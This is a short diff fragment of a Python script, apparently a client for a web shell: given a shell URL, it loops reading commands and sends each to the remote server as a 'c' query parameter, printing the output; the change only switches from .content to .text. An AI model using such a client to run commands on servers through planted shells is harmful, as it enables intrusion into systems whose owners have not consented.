@@ -27,5 +27,5 @@ if args.shell_url:
     url = str(args.shell_url)
     while True:
         cmd = str(input(">> "))
-        r = get(url+"?c={0}".format(cmd)).content
+        r = get(url+"?c={0}".format(cmd)).text
         print(r)  
